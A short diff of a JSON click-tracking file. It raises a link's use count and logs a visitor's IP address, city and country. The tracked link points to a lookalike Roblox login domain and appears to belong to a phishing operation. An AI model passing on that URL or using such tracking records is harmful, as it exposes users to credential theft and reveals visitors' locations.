@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1015,
+    "useCount": 1016,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8235,6 +8235,14 @@
       },
       {
         "timestamp": 1777225415158,
+        "ip": "92.211.25.80",
+        "country": "Germany",
+        "city": "Bonn",
+        "flag": "🇩🇪",
+        "countryCode": "DE"
+      },
+      {
+        "timestamp": 1777225426773,
         "ip": "92.211.25.80",
         "country": "Germany",
         "city": "Bonn",
